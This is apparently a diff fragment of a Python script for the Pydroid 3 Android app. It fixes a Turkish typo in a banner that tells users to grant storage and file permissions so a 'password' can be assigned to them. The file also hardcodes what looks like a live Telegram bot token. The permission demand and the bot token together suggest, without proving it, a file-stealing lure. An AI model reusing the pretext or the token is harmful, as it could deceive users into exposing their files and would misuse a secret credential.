@@ -39,7 +39,7 @@ Sure, sistemin karmasikligina bağlı olarak degisiklik gösterebilir.
 
 DIKKAT : PYDROID 3 UYGULAMASININ AYARLARINA GIDIP DEPOLAMA VE 
 DOSYA IZINLERINI VERMENIZ GEREKMEkTEDIR. BU IZINLERI VERMEZSENIZ,
-sifreyi sisteme kaydemeyip size atamayiz.
+sifreyi sisteme kaydedemeyip size atamayiz.
 """)
 
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
